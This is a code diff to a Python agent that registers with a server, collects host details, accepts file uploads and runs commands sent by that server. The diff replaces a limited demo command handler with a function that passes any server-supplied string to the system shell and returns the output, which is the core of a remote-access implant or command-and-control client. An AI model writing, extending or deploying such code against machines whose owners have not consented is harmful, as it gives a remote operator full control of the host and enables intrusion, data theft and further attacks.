@@ -3,6 +3,8 @@ import json
 import os
 import platform
 import socket
+import subprocess
+import sys
 import time
 import uuid
 
@@ -74,16 +76,16 @@ def collect_info():
 def run_command(command_obj):
     """
     Execute command from server
-    
+
     Args:
-        command_obj: Can be string (legacy) or dict with 'command' key
-    
+        command_obj: Can be string (shell command) or dict with 'command' key
+
     Returns:
-        Result or dict with status
+        Result string or dict with status
     """
     if isinstance(command_obj, dict):
         command = command_obj.get('command', '').strip()
-        
+
         # Handle file upload
         if command == 'agent.upload':
             return handle_upload_file(
@@ -91,34 +93,58 @@ def run_command(command_obj):
                 command_obj.get('file_data'),
                 command_obj.get('file_size')
             )
-        
-        # Legacy command format (for future expansion)
-        return run_demo_command(command)
-    
+
+        # Dict-wrapped shell command
+        return run_shell(command)
+
     else:
-        # String format (legacy)
-        return run_demo_command(command_obj)
+        # Plain string command
+        return run_shell(str(command_obj))
 
 
-def run_demo_command(command):
+SHELL_TIMEOUT = 30  # seconds
+
+
+def run_shell(command):
+    """
+    Execute a shell command and return combined stdout+stderr.
+
+    Special commands handled before reaching the shell:
+        agent.exit  — signals the agent loop to terminate (handled by handle_task)
+
+    Everything else is forwarded to the OS shell:
+        Windows : cmd.exe /c <command>
+        Unix    : /bin/sh -c <command>
+    """
     command = command.strip()
 
     if command == "agent.exit":
-
         return "agent.exit"
 
-    if command == "whoami":
-        return getpass.getuser()
-    if command == "hostname":
-        return socket.gethostname()
-    if command == "pwd":
-        return os.getcwd()
-    if command == "platform":
-        return platform.platform()
-    if command.startswith("echo "):
-        return command[5:]
+    try:
+        result = subprocess.run(
+            command,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=SHELL_TIMEOUT,
+            # Inherit the current environment so PATH, env vars, etc. are available
+            env=os.environ.copy(),
+        )
+        # Combine stdout and stderr; strip trailing whitespace
+        output = (result.stdout + result.stderr).rstrip()
+        if not output and result.returncode != 0:
+            output = f"[exit {result.returncode}]"
+        return output or ""
 
-    return f"Unsupported demo command: {command}"
+    except subprocess.TimeoutExpired:
+        return f"[error] Command timed out after {SHELL_TIMEOUT}s"
+    except FileNotFoundError as e:
+        return f"[error] Command not found: {e}"
+    except OSError as e:
+        return f"[error] OS error: {e}"
+    except Exception as e:
+        return f"[error] {type(e).__name__}: {e}"
 
 
 def register():
